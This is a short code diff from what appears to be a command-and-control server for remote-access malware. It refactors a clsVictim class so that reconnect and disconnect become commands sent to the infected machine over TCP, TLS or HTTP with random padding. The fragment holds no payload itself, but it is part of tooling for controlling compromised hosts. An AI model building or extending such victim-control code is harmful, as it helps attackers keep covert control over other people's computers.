@@ -279,13 +279,23 @@ public class clsVictim
         }
     }
 
-    public void Reconnect()
+    public void fnSendCmdParam(int nCmd, int nParam)
     {
-
+        switch (m_listener.m_protocol)
+        {
+            case enListenerProtocol.TCP:
+                encSend(nCmd, nParam, clsEZData.fnGenerateRandomStr());
+                break;
+            case enListenerProtocol.TLS:
+                fnSslSend(nCmd, nParam, clsEZData.fnGenerateRandomStr());
+                break;
+            case enListenerProtocol.HTTP:
+                Send(new clsHttpResp(nCmd, nParam, clsEZData.fnGenerateRandomStr()).fnGetBytes());
+                break;
+        }
     }
 
-    public void Disconnect()
-    {
-        socket.Close();
-    }
+    public void fnReconnect() => fnSendCmdParam(0, 1);
+
+    public void fnDisconnect() => fnSendCmdParam(0, 0);
 }
